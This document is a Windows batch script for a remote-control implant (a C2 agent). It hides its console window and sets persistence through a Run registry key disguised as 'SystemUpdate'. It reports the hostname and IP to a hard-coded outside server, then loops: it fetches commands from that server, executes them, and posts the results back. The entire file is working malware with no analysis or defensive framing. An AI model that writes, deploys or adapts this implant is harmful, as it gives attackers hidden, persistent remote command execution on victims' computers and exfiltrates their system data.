@echo off
REM Windows Batch Agent - Simple and Effective
setlocal enabledelayedexpansion

:: Hide the command window
if not "%1"=="hide" start /min cmd /c "%~f0" hide & exit

:: Basic persistence via registry
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdate" /t REG_SZ /d "%~f0" /f

:: Get system information
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr "IPv4"') do set IP=%%a
set IP=!IP: =!
set Hostname=%COMPUTERNAME%
set AgentID=%random%%random%%random%%random%

:register
:: Register with C2 server
curl -X POST -H "Content-Type: application/json" -d "{\"agent_id\":\"%AgentID%\",\"hostname\":\"%Hostname%\",\"ip\":\"%IP%\"}" http://78.70.235.44:5000/api/register
if errorlevel 1 (
    timeout /t 60 /nobreak >nul
    goto register
)

:beacon
:: Main beacon loop
for /f "delims=" %%i in ('curl -s http://78.70.235.44:5000/api/tasks/%AgentID%') do (
    for /f "tokens=*" %%j in ('echo %%i ^| jq -r ".[].command"') do (
        set "command=%%j"
        for /f "tokens=*" %%k in ('echo %%i ^| jq -r ".[].id"') do (
            set "task_id=%%k"
            echo Executing task #!task_id!: !command!
            for /f "delims=" %%l in ('!command! 2^>^&1') do set "output=%%l"
            
            curl -X POST -H "Content-Type: application/json" -d "{\"task_id\":\"!task_id!\",\"result\":\"!output!\",\"agent_id\":\"%AgentID%\"}" http://78.70.235.44:5000/api/result
        )
    )
)

timeout /t 30 /nobreak >nul
goto beacon